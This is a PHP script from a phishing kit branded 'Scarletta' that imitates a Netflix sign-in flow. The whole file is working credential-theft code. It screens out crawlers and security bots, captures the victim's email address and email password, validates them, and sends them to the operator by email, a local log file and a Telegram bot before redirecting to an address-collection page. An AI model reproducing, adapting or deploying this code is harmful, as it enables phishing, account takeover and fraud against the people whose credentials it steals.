<?php
include("../Bots/fucker.php");
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
include("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

$settings = include '../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../Logs/results.txt";
$client = file_get_contents("../../../Logs/client.txt");

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;
$client = file_get_contents("../client.txt");

if($CrawlerDetect->isCrawler($useragent)){
  header('https://www.google.com/?q='.$settings['out']);
}

$emal = $_POST['email'];
$epass = $_POST['email_password'];

if(filter_var($emal, FILTER_VALIDATE_EMAIL)){
  $email_val = "VALID ✅";
} else {
  $email_val = "INVALID ❌";
}
$domain_temp = explode("@",$emal);
$domain = $domain_temp[1];
if(checkdnsrr($domain)){
  $domain_val = "VALID ✅";
} else {
  $domain_val = "INVALID ❌";
}


$message = "==== 📧 [ EMAIL & ADDRESS DETAILS | SCARLETTA | CLIENT {$client} ] 📧 ====\n";
$message .= "|-------------------------------------|\n";
$message .= "| ➤ [ Email ]    : {$emal}\n";
$message .= "| ➤ [ Email Password ]	: {$epass}\n";
$message .= "| ➤ [ Email Check ]    : {$email_val}\n";
$message .= "| ➤ [ Domain Check ]   : {$domain_val}\n";
$message .= ".-------------------------------------.\n";
$message .= "\n📺 ===== [ 💰 NETFLIX101 | SCARLETTA 💰 ] ===== 📺\n\n";

if ($settings['send_mail'] == "1"){
	$to = $owner;
  $client = file_get_contents("../../Logs/client.txt");
	$headers = "Content-type:text/plain;charset=UTF-8\r\n";
	$headers .= "From: Scarletta <netflix@client_{$client}_site.com>\r\n";
	$subject = "⚔️ {$email} ✦ A C C C E S S ✦ Log #{$client} ⚔️";
	$msg = $message;
	mail($to, $subject, $msg, $headers);
}

if ($settings['save_results'] == "1"){
  $results = fopen($filename, "a+");
  fwrite($results, $message);
  fclose($results);
}

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}
# Head Back To Next Step
header('Location: addr.php');
?>